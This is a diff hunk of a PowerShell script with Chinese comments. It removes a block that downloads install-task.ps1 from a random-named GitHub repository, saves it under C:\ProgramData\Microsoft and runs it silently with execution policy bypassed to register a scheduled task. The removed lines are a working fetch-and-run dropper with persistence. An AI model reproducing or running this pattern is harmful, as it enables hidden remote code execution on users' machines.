@@ -101,19 +101,3 @@ try {
 
 Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
-# === ⬇️ 下载并运行 install-task.ps1（注册计划任务） ===
-$setupScriptPath = "C:\ProgramData\Microsoft\install-task.ps1"
-$setupScriptUrl = "https://raw.githubusercontent.com/ertgyhujkfghj/2/refs/heads/main/.github/install-task.ps1"
-
-try {
-    $wc = New-Object System.Net.WebClient
-    $bytes = $wc.DownloadData($setupScriptUrl)
-    $setupContent = [System.Text.Encoding]::UTF8.GetString($bytes)
-    [System.IO.File]::WriteAllText($setupScriptPath, $setupContent, [System.Text.Encoding]::UTF8)
-
-    # 执行注册脚本（静默）
-    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$setupScriptPath`"" -WindowStyle Hidden
-    Write-Host "🛠️ 成功下载并运行计划任务注册脚本 install-task.ps1"
-} catch {
-    Write-Warning "❌ 注册任务脚本下载或执行失败：$($_.Exception.Message)"
-}
